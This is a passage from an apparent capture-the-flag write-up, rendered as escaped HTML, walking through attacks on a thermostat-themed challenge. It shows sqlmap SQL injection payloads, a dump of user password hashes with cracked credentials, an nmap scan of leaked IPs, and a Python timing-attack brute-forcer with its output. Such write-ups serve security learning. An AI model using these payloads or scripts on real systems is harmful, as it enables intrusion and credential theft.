class=\"o\"\u003e[\u003c/span\u003e11/Mar/2019:09:00:30 \u003cspan class=\"nt\"\u003e-0400\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;POST /submit HTTP/1.1\u0026quot;\u003c/span\u003e 200 39 0.2095\n127.0.0.1 - - \u003cspan class=\"o\"\u003e[\u003c/span\u003e11/Mar/2019:09:00:30 EDT] \u003cspan class=\"s2\"\u003e\u0026quot;POST /submit HTTP/1.1\u0026quot;\u003c/span\u003e 200 39\nhttp://localhost:4567/submit -\u0026gt; /submit\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;admin\u0026#39;RnrsuZ\u0026lt;\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;RCnItt\u0026quot;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;admin\u0026quot;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n127.0.0.1 - - \u003cspan class=\"o\"\u003e[\u003c/span\u003e11/Mar/2019:09:00:30 \u003cspan class=\"nt\"\u003e-0400\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;POST /submit HTTP/1.1\u0026quot;\u003c/span\u003e 200 39 0.2091\n127.0.0.1 - - \u003cspan class=\"o\"\u003e[\u003c/span\u003e11/Mar/2019:09:00:30 EDT] \u003cspan class=\"s2\"\u003e\u0026quot;POST /submit HTTP/1.1\u0026quot;\u003c/span\u003e 200 39\n...\n...\n...\n\n\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003epython sqlmap.py \u003cspan class=\"nt\"\u003e-u\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;http://localhost:4567/submit\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e--method\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ePOST \u003cspan class=\"nt\"\u003e--data\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;username=admin\u0026amp;password=admin\u0026amp;cmd=getTemp\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e--fingerprint\u003c/span\u003e \u003cspan class=\"nt\"\u003e--level\u003c/span\u003e 5 \u003cspan class=\"nt\"\u003e--risk\u003c/span\u003e 3\n        ___\n       __H__\n ___ ___[,]_____ ___ ___  \u003cspan class=\"o\"\u003e{\u003c/span\u003e1.3.2.30#dev\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n|_ -| \u003cspan class=\"nb\"\u003e.\u003c/span\u003e \u003cspan class=\"o\"\u003e[(]\u003c/span\u003e     | .\u003cspan class=\"s1\"\u003e\u0026#39;| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 09:00:28 /2019-03-11/\n\n[09:00:28] [INFO] testing connection to the target URL\n[09:00:28] [INFO] checking if the target is protected by some kind of WAF/IPS\n[09:00:29] [INFO] testing if the target URL content is stable\n[09:00:29] [INFO] target URL content is stable\n[09:00:29] [INFO] testing if POST parameter \u0026#39;\u003c/span\u003eusername\u003cspan class=\"s1\"\u003e\u0026#39; is dynamic\n[09:00:30] [WARNING] POST parameter \u0026#39;\u003c/span\u003eusername\u003cspan class=\"s1\"\u003e\u0026#39; does not appear to be dynamic\n[09:00:30] [WARNING] heuristic (basic) test shows that POST parameter \u0026#39;\u003c/span\u003eusername\u003cspan class=\"s1\"\u003e\u0026#39; might not be injectable\n[09:00:30] [INFO] testing for SQL injection on POST parameter \u0026#39;\u003c/span\u003eusername\u003cspan class=\"s1\"\u003e\u0026#39;\n[09:00:30] [INFO] testing \u0026#39;\u003c/span\u003eAND boolean-based blind - WHERE or HAVING clause\u003cspan class=\"s1\"\u003e\u0026#39;\n[09:00:53] [INFO] testing \u0026#39;\u003c/span\u003eOR boolean-based blind - WHERE or HAVING clause\u003cspan class=\"s1\"\u003e\u0026#39;\n[09:01:11] [INFO] testing \u0026#39;\u003c/span\u003eOR boolean-based blind - WHERE or HAVING clause \u003cspan class=\"o\"\u003e(\u003c/span\u003eNOT\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\n[09:01:32] [INFO] testing \u0026#39;\u003c/span\u003eAND boolean-based blind - WHERE or HAVING clause \u003cspan class=\"o\"\u003e(\u003c/span\u003esubquery - comment\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\n[09:01:34] [INFO] POST parameter \u0026#39;\u003c/span\u003eusername\u003cspan class=\"s1\"\u003e\u0026#39; appears to be \u0026#39;\u003c/span\u003eAND boolean-based blind - WHERE or HAVING clause \u003cspan class=\"o\"\u003e(\u003c/span\u003esubquery - comment\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39; injectable\n[09:01:36] [INFO] heuristic (extended) test shows that the back-end DBMS could be \u0026#39;\u003c/span\u003eMySQL\u003cspan class=\"s1\"\u003e\u0026#39;\nit looks like the back-end DBMS is \u0026#39;\u003c/span\u003eMySQL\u003cspan class=\"s1\"\u003e\u0026#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\n...\n...\n...\nsqlmap identified the following injection point(s) with a total of 772 HTTP(s) requests:\n---\nParameter: username (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: username=admin\u0026#39;\u003c/span\u003e AND \u003cspan class=\"nv\"\u003e9499\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003eSELECT \u003cspan class=\"o\"\u003e(\u003c/span\u003eCASE WHEN \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e9499\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e9499\u003cspan class=\"o\"\u003e)\u003c/span\u003e THEN 9499 ELSE \u003cspan class=\"o\"\u003e(\u003c/span\u003eSELECT 1626 UNION SELECT 8715\u003cspan class=\"o\"\u003e)\u003c/span\u003e END\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"nt\"\u003e--\u003c/span\u003e IcWo\u0026amp;password\u003cspan class=\"o\"\u003e=\u003c/span\u003eadmin\u0026amp;cmd\u003cspan class=\"o\"\u003e=\u003c/span\u003egetTemp\n\n    Type: AND/OR time-based blind\n    Title: MySQL \u003cspan class=\"o\"\u003e\u0026gt;=\u003c/span\u003e 5.0.12 AND time-based blind\n    Payload: \u003cspan class=\"nv\"\u003eusername\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eadmin\u003cspan class=\"s1\"\u003e\u0026#39; AND SLEEP(5)-- TrnU\u0026amp;password=admin\u0026amp;cmd=getTemp\n---\n[09:06:35] [INFO] testing MySQL\n[09:06:35] [INFO] confirming MySQL\n[09:06:36] [INFO] the back-end DBMS is MySQL\n[09:06:36] [INFO] actively fingerprinting MySQL\n[09:06:37] [INFO] executing MySQL comment injection fingerprint\nback-end DBMS: active fingerprint: MySQL \u0026gt;= 5.5 (MariaDB fork)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow we can dump the databases and tables.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eavailable databases [4]:\n[*] flitebackend\n[*] information_schema\n[*] mysql\n[*] performance_schema\n\nDatabase: flitebackend\n[2 tables]\n+---------+\n| devices |\n| users   |\n+---------+\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDumping the data from the \u003ccode\u003eusers\u003c/code\u003e table:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eDatabase: flitebackend\nTable: users\n[2 entries]\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |\n| 2  | sevenate | c5b1d550b588178c4bb321069fb688ab |\n+----+----------+----------------------------------+\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBoth the the hashes were easily found online to be \u003ccode\u003eadmin:password\u003c/code\u003e and \u003ccode\u003esevenate:nine10\u003c/code\u003e. However after playing around with the \u003ccode\u003ecmd\u003c/code\u003e parameter\u003cbr\u003e\nI realized that there wasn\u0026#39;t much I could do besides call the \u003ccode\u003egetTemp\u003c/code\u003e and \u003ccode\u003esetTemp\u003c/code\u003e commands which I had found from the APK I had reversed earlier.\u003cbr\u003e\nSo I moved my focus to the \u003ccode\u003edevices\u003c/code\u003e table.\u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003edevices\u003c/code\u003e table contained 151 IPs. I will post a truncated list of the table here. The complete list can be found here: \u003ca title=\"https://pastebin.com/8T7kMede\" href=\"/redirect?url=https%3A%2F%2Fpastebin.com%2F8T7kMede\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://pastebin.com/8T7kMede\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eDatabase: flitebackend\nTable: devices\n[151 entries]\n+-----+-----------------+\n| id  | ip              |\n+-----+-----------------+\n| 1   | 192.88.99.29    |\n| 2   | 192.88.99.117   |\n| 3   | 10.186.74.138   |\n| 4   | 192.88.99.20    |\n| 5   | 252.222.76.84   |\n| 6   | 241.192.235.227 |\n| 7   | 192.88.99.145   |\n| 8   | 192.88.99.150   |\n| 9   | 10.148.253.200  |\n| 10  | 254.15.165.28   |\n...\n...\n...\n| 140 | 10.55.194.248   |\n| 141 | 192.88.99.23    |\n| 142 | 248.104.65.126  |\n| 143 | 244.16.55.86    |\n| 144 | 251.243.170.236 |\n| 145 | 192.88.99.248   |\n| 146 | 192.88.99.55    |\n| 147 | 10.27.78.111    |\n| 148 | 253.200.157.207 |\n| 149 | 192.88.99.145   |\n| 150 | 192.88.99.189   |\n| 151 | 10.2.31.209     |\n+-----+-----------------+\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eMany of these looked like Private/Internal IPs. I decided to pass the list of IP addresses to nmap. As I\u0026#39;m on a university network,\u003cbr\u003e\nmany of those private IP addresses showed up as online with ports open to me. I removed all the IP address that started with 192.*\u003cbr\u003e\nbefore starting the scan\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003ecat \u003c/span\u003edevices.csv | \u003cspan class=\"nb\"\u003egrep\u003c/span\u003e \u003cspan class=\"nt\"\u003e-v\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;^192\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e devices2.csv\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003enmap \u003cspan class=\"nt\"\u003e-iL\u003c/span\u003e devices2.csv\n\nStarting Nmap 7.60 \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2019-03-11 14:04 UTC\nNmap scan report \u003cspan class=\"k\"\u003efor \u003c/span\u003e98.12.196.104.bc.googleusercontent.com \u003cspan class=\"o\"\u003e(\u003c/span\u003e104.196.12.98\u003cspan class=\"o\"\u003e)\u003c/span\u003e\nHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.019s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"nb\"\u003e.\u003c/span\u003e\nNot shown: 997 filtered ports\nPORT     STATE  SERVICE\n22/tcp   open   ssh\n80/tcp   open   http\n3389/tcp closed ms-wbt-server\n\nNmap \u003cspan class=\"k\"\u003edone\u003c/span\u003e: 101 IP addresses \u003cspan class=\"o\"\u003e(\u003c/span\u003e1 host up\u003cspan class=\"o\"\u003e)\u003c/span\u003e scanned \u003cspan class=\"k\"\u003ein \u003c/span\u003e23.76 seconds\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca title=\"http://104.196.12.98\" href=\"/redirect?url=http%3A%2F%2F104.196.12.98\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://104.196.12.98\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is the IP for a new server for FliteThermostat.\u003c/p\u003e\n\n\u003ch2 id=\"stage-4-timing-attack\"\u003eStage 4 - Timing Attack\u003c/h2\u003e\n\n\u003cp\u003eWe are presented with another log-in screen this time. This time however, there is a client-side component to it. The JavaScript code in \u003ccode\u003elogin.js\u003c/code\u003e\u003cbr\u003e\ncombines the username and password from the form into a 32-byte hash. I did not do proper cryptanalysis of the hash, however running some tests on it\u003cbr\u003e\nand going through the code pointed me towards the direction that the hash was destructive and it was not possible to recover the username and password from it.\u003c/p\u003e\n\n\u003cp\u003eThis meant, it was pointless to try to SQL inject the username/password. I tried to SQL inject the hash parameter directly incase it was being compared with a hash in the database\u003cbr\u003e\nand spent a lot of time, trying different forms of injection.\u003c/p\u003e\n\n\u003cp\u003eAfter a lot of failed attempts, I thought of trying a timing attack on the hash comparision similar to challenges I\u0026#39;ve seen in previous CTFs. I implemented a multi-threaded solution\u003cbr\u003e\nwith requests and threading in Python. There were a number of issues I faced:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eThe server rejects the hash if it is not of the right length (32 bytes).\u003c/li\u003e\n\u003cli\u003eI originally tried to bruteforce one hex character (4-bits) at a time, but the timing was too unreliable, so I had to switch to brute forcing 1 byte at a time.\u003c/li\u003e\n\u003cli\u003eIf you used too many threads, the server would somehow slow down, and give you tons of false positives\u003c/li\u003e\n\u003cli\u003eOn my final attempt to get the flag, the server went hay-wire after finding around 20 bytes, so I had to reduce the number of parallel workers from 64 to 4 which made the script very slow.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThis was the final script I used:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003econcurrent.futures\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003etime\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eget_time\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003enew_hash\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003estart\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ereq\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;http://104.196.12.98/\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;hash\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003enew_hash\u003c/span\u003e\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eelapsed\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"n\"\u003estart\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eelapsed\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003ecurr_hash\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecurr_hash\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e//\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e32\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ebest_time\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mf\"\u003e0.0\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ebest_byte\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003ewith\u003c/span\u003e \u003cspan class=\"n\"\u003econcurrent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003efutures\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eThreadPoolExecutor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emax_workers\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e64\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"n\"\u003eexecutor\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003efutures\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[]\u003c/span\u003e\n        \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e256\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n            \u003cspan class=\"n\"\u003enew_hash\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurr_hash\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"si\"\u003e%02\u003c/span\u003e\u003cspan class=\"s\"\u003ex\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"n\"\u003enew_hash\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e64\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003enew_hash\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n            \u003cspan class=\"n\"\u003efutures\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eappend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eexecutor\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esubmit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eget_time\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003enew_hash\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\n        \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e256\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ecurr_time\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003efutures\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003ecurr_time\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003ebest_time\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n                \u003cspan class=\"n\"\u003ebest_time\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurr_time\u003c/span\u003e\n                \u003cspan class=\"n\"\u003ebest_byte\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eassert\u003c/span\u003e \u003cspan class=\"n\"\u003ebest_byte\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n    \u003cspan class=\"n\"\u003efin_byte\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"si\"\u003e%02\u003c/span\u003e\u003cspan class=\"s\"\u003ex\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"n\"\u003ebest_byte\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;Found Byte {} with time {}\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003eformat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efin_byte\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebest_time\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ecurr_hash\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003efin_byte\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecurr_hash\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003epython brute_hash.py\nFound Byte f9 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e1.0551841259002686\nf9\nFound Byte 86 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e1.7021434307098389\nf986\nFound Byte 5a with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e2.191676139831543\nf9865a\nFound Byte 49 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e2.6396777629852295\nf9865a49\nFound Byte 52 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e3.056812286376953\nf9865a4952\nFound Byte a4 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e3.6751813888549805\nf9865a4952a4\nFound Byte f5 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e4.157867431640625\nf9865a4952a4f5\nFound Byte d7 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e4.642802000045776\nf9865a4952a4f5d7\nFound Byte 4b with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e5.1769492626190186\nf9865a4952a4f5d74b\nFound Byte 43 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e5.811188697814941\nf9865a4952a4f5d74b43\nFound Byte f3 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e6.342976093292236\nf9865a4952a4f5d74b43f3\nFound Byte 55 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e6.685908555984497\nf9865a4952a4f5d74b43f355\nFound Byte 8f with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e7.125741720199585\nf9865a4952a4f5d74b43f3558f\nFound Byte ed with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e7.686535358428955\nf9865a4952a4f5d74b43f3558fed\nFound Byte 6a with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e8.13300371170044\nf9865a4952a4f5d74b43f3558fed6a\nFound Byte 02 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e8.572584390640259\nf9865a4952a4f5d74b43f3558fed6a02\nFound Byte 25 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e9.127085447311401\nf9865a4952a4f5d74b43f3558fed6a0225\nFound Byte c6 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e9.615064144134521\nf9865a4952a4f5d74b43f3558fed6a0225c6\nFound Byte 87 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e10.174720764160156\nf9865a4952a4f5d74b43f3558fed6a0225c687\nFound Byte 7f with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e10.610665321350098\nf9865a4952a4f5d74b43f3558fed6a0225c6877f\nFound Byte ba with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e11.085944652557373\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba\nFound Byte 60 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e11.662947177886963\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60\nFound Byte a2 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e12.160533905029297\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a2\nFound Byte b1 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e13.189836025238037\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a2b1\nFound Byte 01 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e12.254333019256592\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a2b101\n^C\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003epython brute_hash.py\nFound Byte a2 with \u003cspan class=\"nb\"\u003etime 